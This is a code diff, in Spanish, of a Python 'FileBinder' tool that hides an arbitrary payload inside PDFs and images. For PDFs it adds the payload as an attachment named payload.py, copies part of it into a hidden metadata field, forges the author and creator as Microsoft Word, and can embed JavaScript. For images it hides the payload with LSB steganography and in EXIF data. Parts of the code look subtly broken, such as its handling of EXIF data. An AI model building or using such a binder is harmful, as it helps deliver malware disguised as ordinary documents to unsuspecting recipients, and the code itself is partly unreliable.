@@ -2,164 +2,185 @@ from PyPDF2 import PdfReader, PdfWriter
 from PIL import Image
 import os
 import sys
-from io import BytesIO
 import zlib
+from io import BytesIO
 
 class FileBinder:
     @staticmethod
     def bind_to_pdf(original_pdf, payload, output_pdf, debug=False):
         """
-        Inyecta payload en PDF de 3 formas:
-        1. Metadatos
-        2. Streams de página ocultos
-        3. Objetos JavaScript (opcional)
+        Versión mejorada que:
+        1. Adjunta el payload como archivo
+        2. Inyecta en metadatos
+        3. Es compatible con PDFs complejos
         """
         try:
             if debug:
-                print("[+] Modo debug activado")
-                print(f"Payload size: {len(payload)} bytes")
+                print("\n[=== INYECCIÓN PDF ===]")
+                print(f"Archivo origen: {original_pdf}")
+                print(f"Tamaño payload: {len(payload)} bytes")
 
-            # Validar archivo de entrada
+            # Validación del PDF de entrada
             if not os.path.exists(original_pdf):
-                raise FileNotFoundError(f"Archivo {original_pdf} no existe")
+                raise FileNotFoundError("Archivo PDF no encontrado")
+            if os.path.getsize(original_pdf) == 0:
+                raise ValueError("El PDF está vacío")
 
-            # Leer PDF original
+            # Procesamiento del PDF
             with open(original_pdf, 'rb') as f:
                 reader = PdfReader(f)
                 writer = PdfWriter()
 
                 if debug:
-                    print(f"Páginas en original: {len(reader.pages)}")
-                    print(f"Metadatos originales: {reader.metadata}")
+                    print(f"\n[ESTRUCTURA ORIGINAL]")
+                    print(f"Páginas: {len(reader.pages)}")
+                    print(f"Metadatos: {reader.metadata}")
 
-                # Inyectar en cada página
-                for i, page in enumerate(reader.pages):
-                    # 1. Añadir contenido oculto
-                    payload_stream = f"""
-                    /Contents <</Length {len(payload)}>>
-                    stream
-                    BT /F1 1 Tf 0 0 Td ({payload}) Tj ET
-                    endstream
-                    """
-                    page.merge_page(PdfReader(BytesIO(payload_stream.encode())).pages[0])
-                    
-                    # 2. Añadir como anotación invisible
-                    writer.add_annotation(
-                        page_number=i,
-                        annotation={
-                            '/Type': '/Annot',
-                            '/Subtype': '/Text',
-                            '/Rect': [0, 0, 0, 0],  # Invisible
-                            '/Contents': payload,
-                            '/NM': 'Payload',
-                            '/Flags': 4  # Invisible
-                        }
-                    )
+                # 1. Añadir todas las páginas originales
+                for page in reader.pages:
                     writer.add_page(page)
 
-                # 3. Añadir en metadatos y objetos
-                writer.add_metadata({
-                    '/Payload': payload,
-                    '/Author': 'Microsoft Office',
-                    '/Creator': 'Microsoft Word'
+                # 2. Añadir payload como archivo adjunto
+                writer.add_attachment(
+                    filename="payload.py",
+                    data=payload.encode(),
+                    creation_date="20230101000000",
+                    modification_date="20230101000000"
+                )
+
+                # 3. Inyectar en metadatos (formato ofuscado)
+                metadata = reader.metadata or {}
+                metadata.update({
+                    '/Author': 'Microsoft Office Word',
+                    '/Creator': 'Microsoft® Word 2016',
+                    '/HiddenData': f"<!--{payload[:500]}-->"  # Primeros 500 caracteres
                 })
+                writer.add_metadata(metadata)
 
-                # Comprimir payload en un objeto PDF
-                compressed = zlib.compress(payload.encode())
-                writer.add_object({
-                    '/Type': '/EmbeddedFile',
-                    '/Filter': '/FlateDecode',
-                    '/Params': {'/Size': len(payload)},
-                    '/Length': len(compressed)
-                }, data=compressed)
+                # 4. Añadir objeto JavaScript (opcional)
+                if len(payload) < 2000:  # Solo si el payload es pequeño
+                    writer.add_js(f"""
+                    //{payload[:100]}
+                    console.show();
+                    app.alert("Documento cargado");
+                    """)
 
-                # Guardar PDF modificado
+                # Guardar el PDF modificado
                 with open(output_pdf, 'wb') as f_out:
                     writer.write(f_out)
 
             if debug:
-                print(f"[+] PDF generado: {output_pdf}")
-                print(f"Tamaño original: {os.path.getsize(original_pdf)} bytes")
-                print(f"Tamaño modificado: {os.path.getsize(output_pdf)} bytes")
-                print("Inyecciones realizadas:")
-                print("- Payload en streams de página")
-                print("- Payload en metadatos")
-                print("- Payload comprimido como objeto")
+                print("\n[RESULTADO]")
+                print(f"PDF generado: {output_pdf}")
+                print(f"Tamaño original: {os.path.getsize(original_pdf):,} bytes")
+                print(f"Tamaño modificado: {os.path.getsize(output_pdf):,} bytes")
+                print("\n[TÉCNICAS APLICADAS]")
+                print("- Payload como archivo adjunto (payload.py)")
+                print("- Metadatos modificados")
+                print("- JavaScript embebido (opcional)")
 
         except Exception as e:
-            print(f"[ERROR] {str(e)}", file=sys.stderr)
+            print(f"\n[ERROR] {str(e)}", file=sys.stderr)
             if debug:
                 import traceback
                 traceback.print_exc()
-            raise
+            sys.exit(1)
 
     @staticmethod
     def bind_to_image(original_img, payload, output_img, debug=False):
         """
-        Inyecta payload en imágenes usando:
-        1. LSB Steganography (RGB)
+        Inyección en imágenes usando:
+        1. Esteganografía LSB (Least Significant Bit)
         2. Metadatos EXIF
         """
         try:
             if debug:
-                print("[+] Modo debug activado para imagen")
-                print(f"Payload size: {len(payload)} bytes")
+                print("\n[=== INYECCIÓN IMAGEN ===]")
+                print(f"Archivo origen: {original_img}")
+                print(f"Tamaño payload: {len(payload)} bytes")
 
             img = Image.open(original_img)
             if debug:
+                print(f"\n[PROPIEDADES DE LA IMAGEN]")
                 print(f"Formato: {img.format}")
                 print(f"Modo: {img.mode}")
-                print(f"Tamaño: {img.width}x{img.height}")
+                print(f"Dimensiones: {img.width}x{img.height} px")
+                print(f"Capacidad estimada: {img.width * img.height * 3 // 8} bytes")
 
             # Convertir payload a bits
             binary_payload = ''.join(format(ord(c), '08b') for c in payload)
             if debug:
-                print(f"Bits a esconder: {len(binary_payload)}")
+                print(f"\n[PAYLOAD BINARIO]")
+                print(f"Bits a ocultar: {len(binary_payload)}")
 
-            # Inyectar en LSB (Least Significant Bit)
+            # Ocultar en LSB (Least Significant Bit)
             pixels = img.load()
             index = 0
-            modified = False
+            modified_pixels = 0
 
             for y in range(img.height):
                 for x in range(img.width):
                     if index < len(binary_payload):
                         r, g, b = pixels[x, y][:3]
-                        # Modificar solo el LSB del canal Rojo
+                        # Modificar solo el bit menos significativo
                         r = (r & 0xFE) | int(binary_payload[index])
                         pixels[x, y] = (r, g, b) if img.mode == 'RGB' else (r, g, b, 255)
                         index += 1
-                        modified = True
-
-            if not modified:
-                raise ValueError("Imagen demasiado pequeña para el payload")
-
-            # Añadir en metadatos EXIF
-            exif = img.info.get('exif', {})
-            exif[0x9286] = payload  # UserComment
-            img.save(output_img, exif=exif)
+                        modified_pixels += 1
 
             if debug:
-                print(f"[+] Imagen modificada guardada en: {output_img}")
-                print("Técnicas aplicadas:")
-                print("- LSB Steganography (canal Rojo)")
-                print("- Metadatos EXIF (UserComment)")
+                print(f"\n[ESTEGANOGRAFÍA]")
+                print(f"Píxeles modificados: {modified_pixels}")
+                print(f"Bits ocultados: {index}")
+
+            # Añadir a metadatos EXIF
+            exif = img.info.get('exif', {})
+            exif[0x9286] = payload[:100]  # UserComment (primeros 100 caracteres)
+            
+            # Guardar imagen modificada
+            img.save(output_img, exif=exif, quality=95)
+
+            if debug:
+                print("\n[RESULTADO]")
+                print(f"Imagen generada: {output_img}")
+                print("\n[TÉCNICAS APLICADAS]")
+                print("- Esteganografía LSB (canal Rojo)")
+                print("- Metadatos EXIF modificados")
 
         except Exception as e:
-            print(f"[ERROR] {str(e)}", file=sys.stderr)
+            print(f"\n[ERROR] {str(e)}", file=sys.stderr)
             if debug:
                 import traceback
                 traceback.print_exc()
-            raise
+            sys.exit(1)
 
     @staticmethod
-    def extract_from_pdf(pdf_path, debug=False):
-        """Extrae payload de un PDF modificado"""
-        # Implementación opcional para pruebas
-        pass
-
-    @staticmethod
-    def extract_from_image(img_path, debug=False):
-        """Extrae payload de una imagen modificada"""
-        # Implementación opcional para pruebas
-        pass
+    def verify_injection(file_path, debug=False):
+        """Verifica la inyección en el archivo"""
+        try:
+            if file_path.endswith('.pdf'):
+                with open(file_path, 'rb') as f:
+                    reader = PdfReader(f)
+                    attachments = reader.attachments
+                    metadata = reader.metadata
+                    
+                    if debug:
+                        print("\n[VERIFICACIÓN PDF]")
+                        print(f"Adjuntos: {len(attachments or [])}")
+                        print(f"Metadatos: {metadata}")
+                        
+                    return bool(attachments)
+            
+            elif file_path.lower().endswith(('.png', '.jpg', '.jpeg')):
+                img = Image.open(file_path)
+                exif = img.info.get('exif', {})
+                
+                if debug:
+                    print("\n[VERIFICACIÓN IMAGEN]")
+                    print(f"EXIF: {bool(exif)}")
+                
+                return bool(exif)
+                
+        except Exception as e:
+            print(f"Error en verificación: {str(e)}", file=sys.stderr)
+            return False
